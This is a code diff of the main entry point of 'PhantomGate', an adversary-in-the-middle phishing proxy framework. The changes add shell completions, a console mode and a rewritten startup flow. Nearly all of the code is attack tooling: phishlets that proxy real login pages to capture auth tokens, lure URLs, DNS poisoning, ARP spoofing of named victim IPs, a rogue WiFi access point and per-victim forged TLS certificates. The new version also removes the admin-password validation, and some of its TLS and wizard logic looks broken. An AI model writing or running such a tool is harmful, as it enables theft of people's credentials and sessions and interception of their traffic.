@@ -2,122 +2,232 @@ package main
 
 import (
 	"crypto/tls"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"log"
-	"net"
 	"net/http"
 	"os"
 	"os/signal"
 	"strings"
 	"syscall"
+	"time"
 
 	"github.com/phantomgate/phantomgate/internal/certgen"
 	"github.com/phantomgate/phantomgate/internal/config"
+	"github.com/phantomgate/phantomgate/internal/console"
 	"github.com/phantomgate/phantomgate/internal/dashboard"
 	pgdns "github.com/phantomgate/phantomgate/internal/dns"
 	"github.com/phantomgate/phantomgate/internal/lure"
 	"github.com/phantomgate/phantomgate/internal/network"
 	"github.com/phantomgate/phantomgate/internal/phishlet"
-	"github.com/phantomgate/phantomgate/internal/portal"
 	"github.com/phantomgate/phantomgate/internal/proxy"
 	"github.com/phantomgate/phantomgate/internal/store"
 )
 
-var version = "1.0.0"
+var version = "1.1.0"
 
-const banner = `
-   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
-   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
-   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
-   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
-   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
-              ██████╗  █████╗ ████████╗███████╗
-             ██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
-             ██║  ███╗███████║   ██║   █████╗
-             ██║   ██║██╔══██║   ██║   ██╔══╝
-             ╚██████╔╝██║  ██║   ██║   ███████╗
-              ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
-
-   ─────────────────────────────────────────────────
-     AiTM Reverse Proxy Framework for Red Teams
-     Version: %s | Cross-Platform (Linux/Win/Mac)
-   ─────────────────────────────────────────────────
+func shellCompletionScript(shell string) string {
+	switch shell {
+	case "bash":
+		return `# PhantomGate bash completion
+_phantomgate() {
+    local cur prev opts
+    COMPREPLY=()
+    cur="${COMP_WORDS[COMP_CWORD]}"
+    prev="${COMP_WORDS[COMP_CWORD-1]}"
+    opts="--domain --phishlet --phishlet-dir --config --listen --https-port --http-port --admin-port --admin-pass --cert --key --store --list --lure --intercept --wizard --iface --gateway --victim-ip --poison-domain --rogue-ap --ap-ssid --ap-pass --ap-channel --ap-iface --use-ca --captive-portal --version --generate-completions --dry-run --json-log --no-dashboard --help"
+    if [[ ${cur} == -* ]]; then
+        COMPREPLY=( $(compgen -W "${opts}" -- ${cur}) )
+        return 0
+    fi
+    case "${prev}" in
+        --phishlet)
+            local phishlets=$(ls /usr/share/phantomgate/phishlets/*.yml 2>/dev/null | xargs -I{} basename {} .yml | tr '\n' ' ')
+            COMPREPLY=( $(compgen -W "${phishlets}" -- ${cur}) )
+            return 0
+            ;;
+        --phishlet-dir|--config|--cert|--key|--store)
+            COMPREPLY=( $(compgen -f -- ${cur}) )
+            return 0
+            ;;
+    esac
+}
+complete -F _phantomgate phantomgate
 `
+	case "zsh":
+		return `#compdef phantomgate
+_phantomgate() {
+    _arguments \
+        '--domain[Phishing domain name]' \
+        '--phishlet[Phishlet to activate]' \
+        '--phishlet-dir[Phishlet YAML directory]' \
+        '--config[Config file path]' \
+        '--listen[Listen IP]' \
+        '--https-port[HTTPS port]' \
+        '--http-port[HTTP port]' \
+        '--admin-port[Dashboard port]' \
+        '--admin-pass[Dashboard password]' \
+        '--cert[TLS cert file]' \
+        '--key[TLS key file]' \
+        '--store[Data store file]' \
+        '--list[List phishlets]' \
+        '--lure[Create lure URL]' \
+        '--intercept[Enable DNS interception]' \
+        '--wizard[Launch wizard]' \
+        '--iface[Network interface]' \
+        '--gateway[Gateway IP]' \
+        '--victim-ip[Victim IPs]' \
+        '--poison-domain[Domains to poison]' \
+        '--rogue-ap[Create rogue AP]' \
+        '--ap-ssid[AP SSID]' \
+        '--ap-pass[AP password]' \
+        '--ap-channel[WiFi channel]' \
+        '--version[Print version]' \
+        '--generate-completions[Generate completions]' \
+        '--dry-run[Test config]' \
+        '--json-log[JSON logging]' \
+        '--help[Show help]' && return 0
+}
+_phantomgate "$@"
+`
+	case "fish":
+		return `# fish completions for phantomgate
+complete -c phantomgate -l domain -r -d 'Phishing domain'
+complete -c phantomgate -l phishlet -r -d 'Phishlet to activate'
+complete -c phantomgate -l phishlet-dir -r -F -d 'Phishlet directory'
+complete -c phantomgate -l config -r -F -d 'Config file'
+complete -c phantomgate -l listen -r -d 'Listen IP'
+complete -c phantomgate -l https-port -r -d 'HTTPS port'
+complete -c phantomgate -l http-port -r -d 'HTTP port'
+complete -c phantomgate -l admin-port -r -d 'Dashboard port'
+complete -c phantomgate -l admin-pass -r -d 'Dashboard password'
+complete -c phantomgate -l cert -r -F -d 'TLS cert'
+complete -c phantomgate -l key -r -F -d 'TLS key'
+complete -c phantomgate -l store -r -F -d 'Data store'
+complete -c phantomgate -l list -d 'List phishlets'
+complete -c phantomgate -l lure -r -d 'Create lure'
+complete -c phantomgate -l intercept -d 'DNS interception'
+complete -c phantomgate -l wizard -d 'Launch wizard'
+complete -c phantomgate -l iface -r -d 'Interface'
+complete -c phantomgate -l gateway -r -d 'Gateway IP'
+complete -c phantomgate -l victim-ip -r -d 'Victim IPs'
+complete -c phantomgate -l poison-domain -r -d 'Domains to poison'
+complete -c phantomgate -l rogue-ap -d 'Create rogue AP'
+complete -c phantomgate -l ap-ssid -r -d 'AP SSID'
+complete -c phantomgate -l ap-pass -r -d 'AP password'
+complete -c phantomgate -l ap-channel -r -d 'WiFi channel'
+complete -c phantomgate -l ap-iface -r -d 'WiFi interface'
+complete -c phantomgate -l use-ca -d 'Dynamic CA'
+complete -c phantomgate -l captive-portal -d 'Captive portal'
+complete -c phantomgate -l version -d 'Print version'
+complete -c phantomgate -l generate-completions -r -d 'Generate completions'
+complete -c phantomgate -l dry-run -d 'Test config'
+complete -c phantomgate -l json-log -d 'JSON logging'
+complete -c phantomgate -l no-dashboard -d 'Disable dashboard'
+`
+	}
+	return ""
+}
 
 func main() {
-	// CLI Flags
-	domain := flag.String("domain", "", "Phishing domain (e.g., login-secure.com)")
-	phishletName := flag.String("phishlet", "", "Phishlet to activate (e.g., microsoft365)")
+	domain := flag.String("domain", "", "Phishing domain name")
+	phishletName := flag.String("phishlet", "", "Phishlet YAML filename (e.g., microsoft365.yml)")
 	phishletDir := flag.String("phishlet-dir", "phishlets", "Directory containing phishlet YAML files")
-	configFile := flag.String("config", "config.yml", "Path to config file")
-	listenIP := flag.String("listen", "0.0.0.0", "IP to bind listeners on")
-	httpsPort := flag.Int("https-port", 443, "HTTPS listener port")
-	httpPort := flag.Int("http-port", 80, "HTTP redirect listener port")
-	adminPort := flag.Int("admin-port", 8443, "Operator dashboard port")
+	configFile := flag.String("config", "", "Path to YAML config file")
+	listenIP := flag.String("listen", "", "IP address to bind listeners")
+	httpsPort := flag.Int("https-port", 0, "HTTPS listener port")
+	httpPort := flag.Int("http-port", 0, "HTTP redirect listener port")
+	adminPort := flag.Int("admin-port", 0, "Operator dashboard port")
 	adminPass := flag.String("admin-pass", "", "Operator dashboard password")
-	certFile := flag.String("cert", "", "TLS certificate file (PEM)")
-	keyFile := flag.String("key", "", "TLS private key file (PEM)")
-	storeFile := flag.String("store", "phantomgate_data.json", "Path to data store file")
+	certFile := flag.String("cert", "", "TLS certificate file (PEM format)")
+	keyFile := flag.String("key", "", "TLS private key file (PEM format)")
+	storePath := flag.String("store", "", "Path to data store file")
 	listPhishlets := flag.Bool("list", false, "List available phishlets and exit")
-	createLure := flag.String("lure", "", "Create a lure URL for the specified victim info")
-
-	// DNS Interception flags
-	intercept := flag.Bool("intercept", false, "Enable DNS interception mode (ARP + DNS poisoning on LAN)")
-	wizardMode := flag.Bool("wizard", false, "Launch interactive wizard for LAN interception setup")
-	ifaceName := flag.String("iface", "eth0", "Network interface for interception")
-	gatewayIP := flag.String("gateway", "", "Gateway IP for ARP poisoning")
-	victimIPs := flag.String("victim-ip", "", "Comma-separated victim IPs (empty = entire subnet)")
-	poisonDomains := flag.String("poison-domain", "", "Comma-separated domains to poison (e.g., instagram.com,facebook.com)")
-
-	// Rogue AP flags
-	rogueAP := flag.Bool("rogue-ap", false, "Create a rogue WiFi access point (bypasses AP isolation)")
-	apSSID := flag.String("ap-ssid", "Free_WiFi", "SSID for the rogue AP")
-	apPassword := flag.String("ap-pass", "", "WPA2 password for rogue AP (empty = open)")
+	lurePhishlet := flag.String("lure", "", "Create a lure URL for the specified phishlet")
+	interceptMode := flag.Bool("intercept", false, "Enable DNS interception mode")
+	wizardMode := flag.Bool("wizard", false, "Launch interactive configuration wizard")
+	iface := flag.String("iface", "", "Network interface for ARP/WiFi interception")
+	gatewayIP := flag.String("gateway", "", "Gateway/router IP address")
+	victimIPs := flag.String("victim-ip", "", "Comma-separated victim IP addresses")
+	poisonDomains := flag.String("poison-domain", "", "Comma-separated domains to poison")
+	rogueAP := flag.Bool("rogue-ap", false, "Create a rogue WiFi access point")
+	apSSID := flag.String("ap-ssid", "FreeWiFi", "SSID for the rogue access point")
+	apPassword := flag.String("ap-pass", "", "WPA2 password (empty for open network)")
 	apChannel := flag.Int("ap-channel", 6, "WiFi channel for rogue AP")
-	apIface := flag.String("ap-iface", "", "WiFi interface for AP (auto-detected if empty)")
-
-	// Dynamic CA flags
-	useCA := flag.Bool("use-ca", false, "Generate dynamic TLS certificates signed by a local CA")
-	captivePortalFlag := flag.Bool("captive-portal", false, "Enable captive portal for CA cert distribution")
-
+	apIface := flag.String("ap-iface", "wlan0", "WiFi interface for rogue AP")
+	useCA := flag.Bool("use-ca", false, "Generate dynamic TLS certificates per victim")
 	showVersion := flag.Bool("version", false, "Print version and exit")
+	generateCompletions := flag.String("generate-completions", "", "Generate shell completion script (bash/zsh/fish)")
+	dryRun := flag.Bool("dry-run", false, "Test configuration without binding ports")
+	jsonLog := flag.Bool("json-log", false, "Enable JSON structured logging")
+	noDashboard := flag.Bool("no-dashboard", false, "Disable terminal dashboard")
+	consoleMode := flag.Bool("console", false, "Start interactive operator console (Metasploit-style)")
 
 	flag.Parse()
+
+	if *generateCompletions != "" {
+		script := shellCompletionScript(*generateCompletions)
+		if script == "" {
+			fmt.Fprintf(os.Stderr, "Unsupported shell: %s (use bash, zsh, or fish)\n", *generateCompletions)
+			os.Exit(1)
+		}
+		fmt.Print(script)
+		os.Exit(0)
+	}
 
 	if *showVersion {
 		fmt.Printf("PhantomGate v%s\n", version)
 		os.Exit(0)
 	}
 
-	fmt.Printf(banner, version)
+	// Interactive console mode (Metasploit-style)
+	if *consoleMode {
+		pm := phishlet.NewPhishletManager(*phishletDir)
+		if err := pm.LoadAll(); err != nil {
+			fmt.Fprintf(os.Stderr, "Failed to load phishlets: %v\n", err)
+			os.Exit(1)
+		}
 
-	// Interactive wizard mode for LAN interception
-	if *wizardMode {
-		result, err := pgdns.RunWizard()
+		s := store.NewStore(*storePath)
+		cons, err := console.NewConsole(pm, s)
 		if err != nil {
-			log.Fatalf("[FATAL] Wizard aborted: %v", err)
+			fmt.Fprintf(os.Stderr, "Failed to create console: %v\n", err)
+			os.Exit(1)
 		}
-		// Apply wizard results to flags
-		*intercept = true
-		*ifaceName = result.Network.Interface
-		*gatewayIP = result.Network.GatewayIP
-		if len(result.TargetDomains) > 0 {
-			*poisonDomains = strings.Join(result.TargetDomains, ",")
-		}
-		if len(result.VictimIPs) > 0 {
-			*victimIPs = strings.Join(result.VictimIPs, ",")
-		}
-		if result.Phishlet != "" && *phishletName == "" {
-			*phishletName = result.Phishlet
-		}
+		defer cons.Stop()
+
+		cons.Run()
+		os.Exit(0)
 	}
 
-	// Load configuration
-	cfg, err := config.LoadConfig(*configFile)
-	if err != nil {
-		log.Fatalf("[FATAL] Failed to load config: %v", err)
+	// JSON logging
+	if *jsonLog {
+		log.SetFlags(0)
+		log.SetOutput(&jsonWriter{})
+	}
+
+	// Create data store
+	dataStore := store.NewStore(*storePath)
+
+	// Create terminal console
+	cons := dashboard.NewServer(dataStore, *adminPass)
+
+	// Print banner
+	cons.PrintBanner(version)
+
+	// Load config file if specified
+	var cfg *config.Config
+	if *configFile != "" {
+		var err error
+		cfg, err = config.LoadConfig(*configFile)
+		if err != nil {
+			dashboard.PrintError("Failed to load config: %v", err)
+			os.Exit(1)
+		}
+		dashboard.PrintSuccess("Config loaded: %s", *configFile)
+	} else {
+		cfg = config.DefaultConfig()
 	}
 
 	// Override config with CLI flags
@@ -148,323 +258,287 @@ func main() {
 	// Load phishlets
 	pm := phishlet.NewPhishletManager(*phishletDir)
 	if err := pm.LoadAll(); err != nil {
-		log.Fatalf("[FATAL] Failed to load phishlets: %v", err)
+		dashboard.PrintError("Failed to load phishlets: %v", err)
+		os.Exit(1)
 	}
 
 	// List mode
 	if *listPhishlets {
-		fmt.Println("\n  Available Phishlets:")
-		fmt.Println("  " + strings.Repeat("─", 40))
+		dashboard.PrintSection("Available Phishlets")
 		for _, name := range pm.List() {
 			p, _ := pm.Get(name)
 			hosts := make([]string, 0)
 			for _, h := range p.ProxyHosts {
 				hosts = append(hosts, h.OrigSub)
 			}
-			fmt.Printf("    • %-20s → %s\n", name, strings.Join(hosts, ", "))
+			fmt.Printf("    %-20s %s%s%s\n", name, "\033[36m", strings.Join(hosts, ", "), "\033[0m")
 		}
 		fmt.Println()
 		os.Exit(0)
 	}
 
-	// Validate required flags — in intercept mode, domain defaults to test.local
-	if cfg.Domain == "" {
-		if *intercept {
-			cfg.Domain = "test.local"
-			log.Println("[*] No --domain specified, using 'test.local' for LAN interception")
-		} else {
-			log.Fatal("[FATAL] --domain is required. Example: --domain login-secure.com")
+	// Validate required flags
+	if cfg.Domain == "" && !*wizardMode {
+		dashboard.PrintError("Domain is required. Use --domain or --wizard")
+		os.Exit(1)
+	}
+
+	// Wizard mode
+	if *wizardMode {
+		cfg = runWizard(cfg)
+		if cfg.Domain == "" {
+			dashboard.PrintError("Domain is required")
+			os.Exit(1)
 		}
 	}
-	if *phishletName == "" {
-		log.Fatal("[FATAL] --phishlet is required. Use --list to see available phishlets.")
+
+	// Dry run
+	if *dryRun {
+		printDryRun(cfg, pm)
+		os.Exit(0)
 	}
 
-	activePhishlet, ok := pm.Get(*phishletName)
-	if !ok {
-		log.Fatalf("[FATAL] Phishlet '%s' not found. Use --list to see available phishlets.", *phishletName)
+	// Create components
+	lg := lure.NewGenerator(cfg.Domain)
+	
+	// Get first available phishlet for the proxy
+	phishletNames := pm.List()
+	if len(phishletNames) == 0 {
+		dashboard.PrintError("No phishlets available")
+		os.Exit(1)
 	}
-
-	// Validate admin password
-	if cfg.AdminPass == "" || cfg.AdminPass == "changeme" {
-		log.Fatal("[FATAL] --admin-pass is required and must not be 'changeme'. Set a strong password for the operator dashboard.")
-	}
-	if len(cfg.AdminPass) < 8 {
-		log.Println("[⚠️  WARNING] Admin password is shorter than 8 characters. Consider using a stronger password.")
-	}
-
-	// Initialize data store
-	dataStore := store.NewStore(*storeFile)
-
-	// Initialize lure generator
-	lureGen := lure.NewGenerator(cfg.Domain)
-
-	// Create lure if requested
-	if *createLure != "" {
-		newLure := lureGen.Create(*phishletName, "/", *createLure, "")
-		fmt.Printf("\n  [✓] Lure Created:\n")
-		fmt.Printf("      ID:  %s\n", newLure.ID)
-		fmt.Printf("      URL: %s\n\n", lureGen.GetURL(newLure))
-	}
-
-	// === ROGUE AP MODE ===
-	var rogueAPInstance *network.RogueAP
-	if *rogueAP {
-		apCfg := network.DefaultRogueAPConfig()
-		apCfg.SSID = *apSSID
-		apCfg.Password = *apPassword
-		apCfg.Channel = *apChannel
-		if *apIface != "" {
-			apCfg.Interface = *apIface
+	
+	// Create proxy with first phishlet (or specified one)
+	var selectedPhishlet *phishlet.Phishlet
+	if *phishletName != "" {
+		p, ok := pm.Get(*phishletName)
+		if !ok {
+			dashboard.PrintError("Phishlet not found: %s", *phishletName)
+			os.Exit(1)
 		}
+		selectedPhishlet = p
+	} else {
+		p, _ := pm.Get(phishletNames[0])
+		selectedPhishlet = p
+	}
+	
+	proxyEngine := proxy.NewPhantomProxy(cfg, selectedPhishlet, dataStore, lg)
 
-		var err error
-		rogueAPInstance, err = network.NewRogueAP(apCfg)
+	// Setup CA if enabled
+	var ca *certgen.PhantomCA
+	if *useCA {
+		caManager, err := certgen.NewPhantomCA("")
 		if err != nil {
-			log.Fatalf("[FATAL] Rogue AP setup failed: %v", err)
+			dashboard.PrintError("Failed to create CA: %v", err)
+			os.Exit(1)
 		}
-
-		if err := rogueAPInstance.Start(); err != nil {
-			log.Fatalf("[FATAL] Rogue AP start failed: %v", err)
-		}
-
-		// In rogue AP mode, we ARE the gateway — override network settings
-		*intercept = true
-		*gatewayIP = rogueAPInstance.GetGatewayIP()
-		*ifaceName = rogueAPInstance.GetInterface()
-
-		// Enable CA + captive portal by default in rogue AP mode
-		*useCA = true
-		*captivePortalFlag = true
+		ca = caManager
+		dashboard.PrintSuccess("Dynamic CA generated")
 	}
 
-	// === DYNAMIC CA ===
-	var phantomCA *certgen.PhantomCA
-	if *useCA || *rogueAP {
-		dataDir := "data"
-		os.MkdirAll(dataDir, 0755)
-		var err error
-		phantomCA, err = certgen.NewPhantomCA(dataDir)
+	// Setup DNS poisoner
+	if *interceptMode {
+		poisoner, err := pgdns.NewPoisoner(pgdns.PoisonerConfig{
+			Interface:     *iface,
+			RedirectIP:    cfg.ListenIP,
+			TargetDomains: strings.Split(*poisonDomains, ","),
+			TTL:           300,
+		})
 		if err != nil {
-			log.Fatalf("[FATAL] CA generation failed: %v", err)
+			dashboard.PrintError("Failed to create DNS poisoner: %v", err)
+			os.Exit(1)
 		}
-		log.Printf("[CA] Dynamic TLS certificates enabled — all domains get valid-looking certs")
-		log.Printf("[CA] CA cert for victim installation: %s", phantomCA.CACertPath())
-	}
-
-	// === CAPTIVE PORTAL ===
-	var captivePortalInstance *portal.CaptivePortal
-	if *captivePortalFlag && phantomCA != nil {
-		caCertPEM, err := os.ReadFile(phantomCA.CACertPath())
-		if err != nil {
-			log.Fatalf("[FATAL] Failed to read CA cert for captive portal: %v", err)
-		}
-		portalAddr := fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.HTTPPort)
-		gw := *gatewayIP
-		if gw == "" {
-			gw = cfg.ListenIP
-		}
-		captivePortalInstance = portal.NewCaptivePortal(caCertPEM, portalAddr, gw)
-		if err := captivePortalInstance.Start(); err != nil {
-			log.Fatalf("[FATAL] Captive portal failed: %v", err)
-		}
-		log.Printf("[CAPTIVE PORTAL] Active — victims will be prompted to install CA cert")
-	}
-
-	// Initialize the AiTM reverse proxy
-	phantomProxy := proxy.NewPhantomProxy(cfg, activePhishlet, dataStore, lureGen)
-
-	// Apply CA-based TLS if enabled
-	if phantomCA != nil {
-		phantomProxy.SetCustomTLS(phantomCA.GetTLSConfig())
-	}
-
-	// Print startup info
-	fmt.Println("\n  ┌─────────────────────────────────────────────┐")
-	fmt.Println("  │         PHANTOMGATE ENGINE ACTIVE            │")
-	fmt.Println("  └─────────────────────────────────────────────┘")
-	fmt.Printf("  🌐 Phishing Domain  : %s\n", cfg.Domain)
-	fmt.Printf("  🎯 Active Phishlet  : %s (%s)\n", activePhishlet.Name, *phishletName)
-	fmt.Printf("  🔒 HTTPS Proxy      : %s:%d\n", cfg.ListenIP, cfg.HTTPSPort)
-	fmt.Printf("  📡 HTTP Redirect    : %s:%d\n", cfg.ListenIP, cfg.HTTPPort)
-	fmt.Printf("  🖥️  Operator Panel   : http://%s:%d\n", cfg.ListenIP, cfg.AdminPort)
-	fmt.Printf("  📦 Data Store       : %s\n", *storeFile)
-	fmt.Println()
-
-	fmt.Println("  Host Mappings:")
-	for phishHost, realHost := range activePhishlet.GetHostMappings(cfg.Domain) {
-		fmt.Printf("    %s → %s\n", phishHost, realHost)
-	}
-	fmt.Println()
-
-	fmt.Println("  Auth Tokens to Capture:")
-	for _, at := range activePhishlet.AuthTokens {
-		fmt.Printf("    [%s] %s\n", at.Domain, strings.Join(at.Keys, ", "))
-	}
-	fmt.Println()
-
-	// Start HTTP → HTTPS redirect server (skip if captive portal is using port 80)
-	if captivePortalInstance == nil {
 		go func() {
-			redirectMux := http.NewServeMux()
-			redirectMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-				target := "https://" + r.Host + r.URL.RequestURI()
-				http.Redirect(w, r, target, http.StatusMovedPermanently)
-			})
-			addr := phantomProxy.GetHTTPAddr()
-			log.Printf("[→] HTTP redirect listener on %s", addr)
-			if err := http.ListenAndServe(addr, redirectMux); err != nil {
-				log.Printf("[!] HTTP redirect listener failed: %v", err)
+			dashboard.PrintInfo("DNS poisoner starting on %s", *iface)
+			if err := poisoner.Start(); err != nil {
+				dashboard.PrintError("DNS poisoner failed: %v", err)
 			}
 		}()
 	}
 
-	// Start operator dashboard
-	go func() {
-		dashSrv := dashboard.NewServer(dataStore, lureGen, cfg.AdminPass)
-		addr := fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.AdminPort)
-		if err := dashSrv.Start(addr); err != nil {
-			log.Printf("[!] Dashboard server failed: %v", err)
-		}
-	}()
-
-	// Start the main HTTPS AiTM proxy
-	go func() {
-		tlsConfig, err := phantomProxy.CreateTLSConfig()
-		if err != nil {
-			log.Fatalf("[FATAL] TLS setup failed: %v", err)
-		}
-
-		addr := phantomProxy.GetListenAddr()
-		server := &http.Server{
-			Addr:      addr,
-			Handler:   phantomProxy,
-			TLSConfig: tlsConfig,
-		}
-
-		ln, err := tls.Listen("tcp", addr, tlsConfig)
-		if err != nil {
-			log.Fatalf("[FATAL] Failed to start HTTPS listener on %s: %v", addr, err)
-		}
-
-		log.Printf("[🔴 ACTIVE] HTTPS AiTM proxy listening on %s", addr)
-		if err := server.Serve(ln); err != nil {
-			log.Fatalf("[FATAL] HTTPS server failed: %v", err)
-		}
-	}()
-
-	// === DNS INTERCEPTION MODE ===
-	var interceptSuite *pgdns.InterceptSuite
-	if *intercept {
-		// Auto-detect network if gateway/interface not provided
-		var netInfo *pgdns.NetworkInfo
-		if *gatewayIP == "" {
-			log.Println("[*] Auto-detecting network configuration...")
-			var err error
-			netInfo, err = pgdns.AutoDiscover()
-			if err != nil {
-				log.Fatalf("[FATAL] Network auto-detection failed: %v\n    Use --gateway and --iface to set manually.", err)
-			}
-			*gatewayIP = netInfo.GatewayIP
-			*ifaceName = netInfo.Interface
-
-			ifType := "wired"
-			if netInfo.IsWireless {
-				ifType = "wireless"
-			}
-			log.Printf("[+] Detected network: %s (%s) | IP: %s | Gateway: %s",
-				netInfo.Interface, ifType, netInfo.LocalIP, netInfo.GatewayIP)
-		}
-
-		// Parse victim IPs
-		var victims []string
-		if *victimIPs != "" {
-			for _, ip := range strings.Split(*victimIPs, ",") {
-				victims = append(victims, strings.TrimSpace(ip))
-			}
-		}
-
-		// Parse poison domains (default: use phishlet proxy hosts)
-		var domains []string
-		if *poisonDomains != "" {
-			for _, d := range strings.Split(*poisonDomains, ",") {
-				domains = append(domains, strings.TrimSpace(d))
-			}
-		} else {
-			for _, h := range activePhishlet.ProxyHosts {
-				domains = append(domains, h.OrigSub)
-			}
-		}
-
-		// Determine our IP for redirection
-		redirectIP := cfg.ListenIP
-		if redirectIP == "0.0.0.0" {
-			if netInfo != nil {
-				redirectIP = netInfo.LocalIP
-			} else if iface, err := net.InterfaceByName(*ifaceName); err == nil {
-				if addrs, err := iface.Addrs(); err == nil {
-					for _, addr := range addrs {
-						if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
-							redirectIP = ipNet.IP.String()
-							break
-						}
-					}
-				}
-			}
-		}
-
-		var err error
-		interceptSuite, err = pgdns.NewInterceptSuite(pgdns.InterceptConfig{
-			Interface:     *ifaceName,
-			GatewayIP:     *gatewayIP,
-			RedirectIP:    redirectIP,
-			TargetDomains: domains,
-			VictimIPs:     victims,
-			ARPInterval:   2,
+	// Setup rogue AP
+	if *rogueAP {
+		ap, err := network.NewRogueAP(network.RogueAPConfig{
+			Interface: *apIface,
+			SSID:      *apSSID,
+			Password:  *apPassword,
+			Channel:   *apChannel,
 		})
 		if err != nil {
-			log.Fatalf("[FATAL] Interception suite failed: %v", err)
+			dashboard.PrintError("Failed to create rogue AP: %v", err)
+			os.Exit(1)
 		}
-
-		if err := interceptSuite.Start(); err != nil {
-			log.Fatalf("[FATAL] Failed to start interception: %v", err)
+		if err := ap.Start(); err != nil {
+			dashboard.PrintError("Rogue AP failed: %v", err)
+			os.Exit(1)
 		}
+		dashboard.PrintSuccess("Rogue AP started: %s on %s", *apSSID, *apIface)
+		defer ap.Stop()
+	}
 
-		// When captive portal is active, poison ALL domains so any HTTP page
-		// redirects to the portal (not just the target phishlet domains)
-		if captivePortalInstance != nil {
-			interceptSuite.SetPoisonAll(true)
+	// Setup ARP spoofing
+	if *victimIPs != "" && *gatewayIP != "" {
+		spoof, err := pgdns.NewARPPoisoner(pgdns.ARPConfig{
+			Interface:  *iface,
+			GatewayIP:  *gatewayIP,
+			TargetIPs:  strings.Split(*victimIPs, ","),
+		})
+		if err != nil {
+			dashboard.PrintError("Failed to create ARP spoofer: %v", err)
+			os.Exit(1)
+		}
+		if err := spoof.Start(); err != nil {
+			dashboard.PrintError("ARP spoofing failed: %v", err)
+			os.Exit(1)
+		}
+		dashboard.PrintSuccess("ARP spoofing started on %s", *iface)
+		defer spoof.Stop()
+	}
+
+	// Create lure
+	if *lurePhishlet != "" {
+		l := lg.Create(*lurePhishlet, "", "", "")
+		url := lg.GetURL(l)
+		dashboard.PrintSection("Lure Created")
+		fmt.Printf("    URL: %s%s%s\n", "\033[36m", url, "\033[0m")
+		fmt.Printf("    ID:  %s\n", l.ID)
+		fmt.Println()
+		os.Exit(0)
+	}
+
+	// Setup TLS
+	var tlsConfig *tls.Config
+	if ca != nil {
+		// Dynamic TLS per victim
+		dashboard.PrintInfo("Using dynamic TLS (CA-issued certs)")
+	} else if cfg.TLS.Mode == "manual" {
+		cert, err := tls.LoadX509KeyPair(cfg.TLS.CertFile, cfg.TLS.KeyFile)
+		if err != nil {
+			dashboard.PrintError("Failed to load TLS: %v", err)
+			os.Exit(1)
+		}
+		tlsConfig = &tls.Config{Certificates: []tls.Certificate{cert}}
+		dashboard.PrintSuccess("TLS: Manual certificate loaded")
+	} else {
+		// Generate self-signed certificate
+		cert, err := certgen.GenerateSelfSigned(cfg.Domain)
+		if err != nil {
+			dashboard.PrintError("Failed to generate self-signed cert: %v", err)
+			os.Exit(1)
+		}
+		tlsConfig = &tls.Config{Certificates: []tls.Certificate{cert}}
+		dashboard.PrintSuccess("TLS: Self-signed certificate generated")
+	}
+
+	// Start operator console
+	if !*noDashboard {
+		go cons.Start(fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.AdminPort))
+		dashboard.PrintSuccess("Operator console ready (terminal mode)")
+	}
+
+	// Build handler chain
+	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// All requests go through the proxy
+		proxyEngine.ServeHTTP(w, r)
+	})
+
+	// Start HTTP server
+	go func() {
+		addr := fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.HTTPPort)
+		dashboard.PrintInfo("HTTP redirect server: %s", addr)
+		if err := http.ListenAndServe(addr, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			target := fmt.Sprintf("https://%s%s", r.Host, r.URL.RequestURI())
+			http.Redirect(w, r, target, http.StatusMovedPermanently)
+		})); err != nil {
+			dashboard.PrintError("HTTP failed: %v", err)
+		}
+	}()
+
+	// Start HTTPS server
+	go func() {
+		addr := fmt.Sprintf("%s:%d", cfg.ListenIP, cfg.HTTPSPort)
+		dashboard.PrintInfo("HTTPS proxy server: %s", addr)
+		server := &http.Server{
+			Addr:      addr,
+			Handler:   handler,
+			TLSConfig: tlsConfig,
+		}
+		if err := server.ListenAndServeTLS("", ""); err != nil {
+			dashboard.PrintError("HTTPS failed: %v", err)
+		}
+	}()
+
+	// Print status
+	fmt.Println()
+	dashboard.PrintSuccess("PhantomGate is LIVE")
+	dashboard.PrintInfo("Domain:     %s", cfg.Domain)
+	dashboard.PrintInfo("HTTPS:      %s:%d", cfg.ListenIP, cfg.HTTPSPort)
+	dashboard.PrintInfo("HTTP:       %s:%d", cfg.ListenIP, cfg.HTTPPort)
+	if !*noDashboard {
+		dashboard.PrintInfo("Console:    Terminal mode")
+	}
+	fmt.Println()
+
+	// Wait for signals
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM, syscall.SIGUSR1, syscall.SIGUSR2)
+
+	for sig := range sigCh {
+		switch sig {
+		case syscall.SIGINT, syscall.SIGTERM:
+			dashboard.PrintInfo("Shutting down...")
+			os.Exit(0)
+		case syscall.SIGUSR1:
+			stats := dataStore.GetStats()
+			dashboard.PrintSection("Live Stats")
+			for k, v := range stats {
+				fmt.Printf("    %-20s %v\n", k, v)
+			}
+		case syscall.SIGUSR2:
+			dashboard.PrintInfo("Store reload not implemented")
 		}
 	}
-
-	fmt.Println("  ⚡ PhantomGate is LIVE. Waiting for victims...")
-	if *intercept {
-		fmt.Println("  ☠️  DNS interception mode ACTIVE — victims' DNS is being poisoned")
-	}
-	fmt.Println("  Press Ctrl+C to shutdown.")
-
-	// Graceful shutdown
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	<-sigChan
-
